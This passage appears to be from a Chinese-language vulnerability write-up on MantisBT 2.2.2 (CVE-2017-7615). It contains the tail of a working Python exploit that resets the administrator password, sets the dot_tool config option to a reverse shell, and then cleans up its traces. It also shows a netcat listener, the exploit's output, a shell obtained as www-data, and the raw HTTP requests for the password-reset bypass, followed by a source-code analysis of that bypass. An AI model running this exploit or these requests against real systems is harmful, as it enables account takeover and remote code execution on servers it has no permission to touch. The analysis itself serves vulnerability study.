                pass
        def Cleanup(self):
            # Delete the config settings that were created to send the reverse shell
            print "Cleaning up"
            cleaned_up = False
            cleanup = requests.Session()
            CleanupHeaders = dict()
            CleanupHeaders.update({'Content-Type': 'application/x-www-form-urlencoded'})
            data = "return=index.php&username=" + self.realname + "&password=" + self.passwd + "&secure_session=on"
            url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/login.php'
            r = cleanup.post(url=url, headers=CleanupHeaders, data=data)
            ConfigsToCleanup = ['dot_tool', 'relationship_graph_enable']
            for config in ConfigsToCleanup:
                # Get adm_config_delete_token
                url = "http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_report.php"
                r = cleanup.get(url=url, headers=self.headers)
                test = split('', r.text)
                # First element of the response list is garbage, delete it
                del test[0]
                cleanup_dict = dict()
                for i in range(len(test)):
                    if config in test[i]:
                        cleanup_dict.update({'config_option': config})
                        cleanup_dict.update({'adm_config_delete_token':
                                                 test[i].split('name="adm_config_delete_token" value=')[1].split('"')[1]})
                        cleanup_dict.update({'user_id': test[i].split('name="user_id" value=')[1].split('"')[1]})
                        cleanup_dict.update({'project_id': test[i].split('name="project_id" value=')[1].split('"')[1]})
                # Delete the config
                print "Deleting the " + config + " config."
                url = "http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_delete.php"
                data = "adm_config_delete_token=" + cleanup_dict['adm_config_delete_token'] + "&user_id=" + cleanup_dict[
                    'user_id'] + "&project_id=" + cleanup_dict['project_id'] + "&config_option=" + cleanup_dict[
                           'config_option'] + "&_confirmed=1"
                r = cleanup.post(url=url, headers=CleanupHeaders, data=data)
                # Confirm if actually cleaned up
                r = cleanup.get(url="http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_report.php",
                                headers=CleanupHeaders, verify=False)
                if config in r.text:
                    cleaned_up = False
                else:
                    cleaned_up = True
            if cleaned_up == True:
                print "Successfully cleaned up"
            else:
                print "Unable to clean up configs"
    exploit = exploit()
    exploit.reset_login()
    exploit.login()
    exploit.CreateConfigOption(option="relationship_graph_enable", value="1")
    exploit.CreateConfigOption(option="dot_tool", value=exploit.ReverseShell + ';')
    exploit.TriggerExploit()
    exploit.Cleanup()
我在我的攻击机上开展监听
    ╰─$ nc -lvvp 4444 -n
    Listening on 0.0.0.0 4444
更改exp当中的攻击机ip,目标ip,mantisLoc等信息后，执行exp
    ╰─$ python CVE-2017-7615_exp.py
    Successfully hijacked account!
    Successfully logged in!
    Triggering reverse shell
    Cleaning up
    Deleting the dot_tool config.
    Deleting the relationship_graph_enable config.
    Successfully cleaned up
成功接受回连获取shell
    ╰─$ nc -lvvp 4444 -n                                                                                                    130 ↵
    Listening on 0.0.0.0 4444
    Connection received on 172.17.0.4 40698
    bash: cannot set terminal process group (12522): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@21467ebf0ffb:/var/www/html/mantisbt-2.2.2$ id
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
## 密码重置漏洞分析
exp中可以看到包含了一个密码重置漏洞和一个认证后的RCE漏洞，由于是个老洞了分析整套的利用修复具体逻辑没有太大意义，因此只分析一下漏洞原理
重置密码的两个数据包
    GET /mantisbt-2.2.2/verify.php?id=1&confirm_hash= HTTP/1.1
    Host: 172.16.113.160:10080
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.24.0
    POST /mantisbt-2.2.2/account_update.php HTTP/1.1
    Host: 172.16.113.160:10080
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.24.0
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID=49copvvmkmrpp014hv2255cup3
    Content-Length: 145
    account_update_token=20220727yZ-LSS6H7Oh2T8e0vtB-7idGE-jtqpkN&password=password&verify_user_id=1&realname=administrator&password_confirm=password
第一个包是为了获取account_update_token的参数值，打开verify.php进行分析
可以看到头部在做的就是从query数据中取出id和confirm_hash参数值，然后将id值传入token_get_value
    /**
     * Get a token's value or null if not found
     * @param integer $p_type    The token type to retrieve.
     * @param integer $p_user_id The user identifier (null for current user).
     * @return array Token row
     */
    function token_get_value( $p_type, $p_user_id = null ) {
        $t_token = token_get( $p_type, $p_user_id );
        if( null !== $t_token ) {
            return $t_token['value'];
        }
        return null;
    }
经过动态调试跟踪发现最终是运行以下命令获取token值
    SELECT * FROM mantis222_tokens_table222 WHERE type=? AND owner=?;
这个值在登陆后才会有值，当我们没有登录的情况下是空的，因此返回null
因此verify.php继续向下运行
    .......
    if( $f_confirm_hash != $t_token_confirm_hash ) {
        trigger_error( ERROR_LOST_PASSWORD_CONFIRM_HASH_INVALID, ERROR );
    }
    ......
就不会触发本应触发的错误，导致此处的校验绕过，继续向下运行到`auth_attempt_script_login( user_get_field(
$f_user_id, 'username' )
);`,会调用user_get_field函数,user_get_field中会将用户id传入user_get_row函数，user_get_row函数又会进一步调用user_cache_row函数
    function user_cache_row( $p_user_id, $p_trigger_errors = true ) {
        global $g_cache_user;
        $c_user_id = (int)$p_user_id;
        if( !isset( $g_cache_user[$c_user_id] ) ) {
            user_cache_array_rows( array( $c_user_id ) );
        }
        $t_user_row = $g_cache_user[$c_user_id];
        if( !$t_user_row ) {
            if( $p_trigger_errors ) {
                error_parameters( (integer)$p_user_id );
                trigger_error( ERROR_USER_BY_ID_NOT_FOUND, ERROR );
            }
            return false;
        }
        return $t_user_row;
    }
此处会从数据库中取出现有的用户信息存入$g_cache_user当中，然后根据$c_user_id（request传入的id值），来获取相应的用户信息$t_user_row。但是如果没有取到有效的$t_user_row值，就会触发错误
此处也能解释在第一个数据包中的id值为什么须为1，因为用户中至少存在一个administrator,ID值为1则有效，如果没有添加其他用户的情况下，request传入除了1以外的值就会触发错误。
继续向下运行加载前端界面，内嵌一行php
    <?php
                        echo form_security_field( 'account_update' );